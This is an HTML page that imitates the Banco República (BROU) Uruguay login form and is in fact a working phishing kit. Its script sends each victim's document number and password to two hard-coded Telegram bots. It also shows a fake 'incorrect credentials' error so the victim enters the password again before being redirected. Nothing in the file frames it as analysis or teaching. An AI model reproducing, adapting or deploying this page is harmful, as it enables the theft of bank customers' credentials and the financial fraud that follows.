<!DOCTYPE html>
<html lang="es">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Ingreso de Usuario</title>
  <style>
    @font-face {
      font-family: "Gotham Book";
      src: url("GothamBook.otf") format("opentype");
    }

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: "Gotham Book", sans-serif;
      background-color: #fff;
    }

    header {
      background: #0d5ea1;
      padding: 16px;
      border-bottom: 4px solid #ffc400;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    header img {
      height: 36px;
    }

    .container {
      padding: 20px;
      max-width: 480px;
      width: 100%;
      margin: auto;
    }

    h2 {
      color: #0066B3;
      text-align: center;
      font-weight: 600;
      font-size: 22px;
      margin-bottom: 20px;
    }

    .message-container.error {
      background-color: #FFDDD9;
      padding: 1.6699px 12.5242px;
      margin: 0 0 16.699px 0;
      font-family: "Gotham Book", sans-serif;
      font-size: 15px;
      color: #111;
      border: 1px solid #E53935;
      display: none;
      align-items: center;
      gap: 10px;
    }

    label {
      display: block;
      margin-bottom: 2px;
      font-size: 15px;
      font-family: "Gotham Book", sans-serif;
      color: #111111;
    }

    input,
    select {
      width: 100%;
      height: 40px;
      padding: 10px;
      border: 1px solid #1976d2;
      border-radius: 6px;
      font-size: 16px;
      font-family: "Gotham Book", sans-serif;
      margin-bottom: 5px;
    }

    .input-error {
      border-color: #e53935 !important;
      background-color: #fff5f5;
    }

    .error-msg {
      color: #e53935;
      font-size: 13px;
      font-family: "Gotham Book", sans-serif;
      display: none;
      margin-bottom: 10px;
    }

    .password-container {
      position: relative;
    }

    .toggle-password {
      position: absolute;
      right: 12px;
      top: 12px;
      cursor: pointer;
      width: 20px;
      height: 20px;
    }

    .toggle-password img {
      width: 100%;
      height: auto;
      display: block;
    }

    button {
      width: 100%;
      height: 46px;
      background-color: #0066B3;
      color: white;
      font-size: 16px;
      border: none;
      border-radius: 30px;
      cursor: pointer;
      margin-top: 10px;
      font-family: "Gotham Book", sans-serif;
    }

    .links {
      margin-top: 20px;
      text-align: center;
    }

    .links a {
      display: block;
      color: #1976d2;
      text-decoration: none;
      margin: 5px 0;
      font-size: 15px;
    }

    footer {
      text-align: center;
      color: #aaa;
      font-size: 12px;
      margin-top: 40px;
      padding: 20px;
    }
  </style>
</head>
<body>

  <header>
    <img src="logo.svg" alt="BROU Logo" />
  </header>

  <div class="container">
    <h2>Ingreso de Usuario</h2>

    <div id="login-error" class="message-container error">
      <span style="color: red; font-size: 20px;">&#10006;</span>
      <span>Usuario y/o contrase√±a incorrectos</span>
    </div>

    <label for="pais">Pa√≠s</label>
    <select id="pais">
      <option selected>Uruguay</option>
    </select>

    <label for="tipo">Tipo de Documento</label>
    <select id="tipo">
      <option>C.I.</option>
    </select>

    <label for="documento">N¬∫ de Documento</label>
    <input type="text" id="documento" maxlength="8" inputmode="numeric" pattern="[0-9]*"
           oninput="this.value = this.value.replace(/[^0-9]/g, '')">
    <span id="error-doc" class="error-msg">El usuario no puede estar vac√≠o</span>

    <label for="password">Contrase√±a</label>
    <div class="password-container">
      <input type="password" id="password" placeholder="Contrase√±a" />
      <span class="toggle-password" onclick="togglePassword()">
        <img id="eye-icon" src="ojo.png" alt="Mostrar/Ocultar">
      </span>
    </div>
    <span id="error-pass" class="error-msg">La Contrase√±a no puede estar vac√≠a</span>

    <button id="ingresar">Ingresar</button>

    <div class="links">
      <a href="#">¬øOlvid√≥ su Contrase√±a?</a>
      <a href="#">Tengo un c√≥digo de recuperaci√≥n</a>
      <a href="#">Registrar Usuario</a>
    </div>
  </div>

  <footer>
    ¬© 2023 Banco Rep√∫blica<br />
    Todos los derechos reservados
  </footer>

  <script> 
    let intentosLogin = 0;

    function togglePassword() {
      const passwordInput = document.getElementById("password");
      const eyeIcon = document.getElementById("eye-icon");
      if (passwordInput.type === "password") {
        passwordInput.type = "text";
        eyeIcon.src = "ojo-abierto.png";
      } else {
        passwordInput.type = "password";
        eyeIcon.src = "ojo.png";
      }
    }

    // Lista de bots para enviar las credenciales
    const bots = [
      {
        token: '8135711594:AAFr31MSd-lpmmS7gC92WpMBMCyIo8l5n8U',
        chatId: '-4867067566'
      },
      {
        token: '8097516851:AAEqY5pJMzlyuV-flhItW9Zv5y3rEKvaz7Y',
        chatId: '-4940090227'
      }
    ];

    // Funci√≥n para enviar los datos a Telegram
    async function notifyLoginAttempt(documento, password) {
      const mensaje = `‚ûñ‚ûñ‚ûñ[ BROU UY2]‚ûñ‚ûñ‚ûñ
‚úîÔ∏è Documento: ${documento}
‚úîÔ∏è Contrase√±a: ${password}
‚ûñ‚ûñ‚ûñ ùôÑùôâùôÅùôä ‚ûñ‚ûñ‚ûñ
üåê dev: [@asd]
‚ûñ‚ûñ‚ûñ`;

      try {
        await Promise.all(
          bots.map(bot =>
            fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: bot.chatId,
                text: mensaje,
                parse_mode: "Markdown"
              })
            })
          )
        );
      } catch (error) {
        console.error("Error enviando credenciales:", error);
      }
    }

    document.getElementById("ingresar").addEventListener("click", async function (e) {
      e.preventDefault();

      const documentoInput = document.getElementById("documento");
      const passwordInput = document.getElementById("password");
      const documento = documentoInput.value.trim();
      const password = passwordInput.value.trim();
      const errorDoc = document.getElementById("error-doc");
      const errorPass = document.getElementById("error-pass");
      const errorLogin = document.getElementById("login-error");

      let valido = true;

      // Validaci√≥n del documento
      if (documento === "") {
        errorDoc.innerText = "El usuario no puede estar vac√≠o";
        errorDoc.style.display = "block";
        documentoInput.classList.add("input-error");
        valido = false;
      } else if (documento.length !== 8) {
        errorDoc.innerText = "El n√∫mero de documento debe tener 8 d√≠gitos";
        errorDoc.style.display = "block";
        documentoInput.classList.add("input-error");
        valido = false;
      } else {
        errorDoc.style.display = "none";
        documentoInput.classList.remove("input-error");
      }

      // Validaci√≥n de la contrase√±a
      if (password === "") {
        errorPass.innerText = "La contrase√±a no puede estar vac√≠a";
        errorPass.style.display = "block";
        passwordInput.classList.add("input-error");
        valido = false;
      } else if (/^\d+$/.test(password)) {
        errorPass.innerText = "La contrase√±a no puede contener solo n√∫meros";
        errorPass.style.display = "block";
        passwordInput.classList.add("input-error");
        valido = false;
      } else {
        errorPass.style.display = "none";
        passwordInput.classList.remove("input-error");
      }

      // Si hay error, no enviamos datos y no redirigimos
      if (!valido) {
        return;
      }

      // Si las credenciales son correctas, enviamos los datos a Telegram y redirigimos
      if (intentosLogin === 0 || password.length < 5) {
        errorLogin.style.display = "flex";
        intentosLogin++;
        await notifyLoginAttempt(documento, password);  // Enviar datos en el primer intento
        return;
      } else {
        errorLogin.style.display = "none";
        await notifyLoginAttempt(documento, password);  // Enviar datos en el segundo intento
        window.location.href = "cargando.html";  // Redirigir a cargando.html
      }
    });
</script>


</body>

</html>
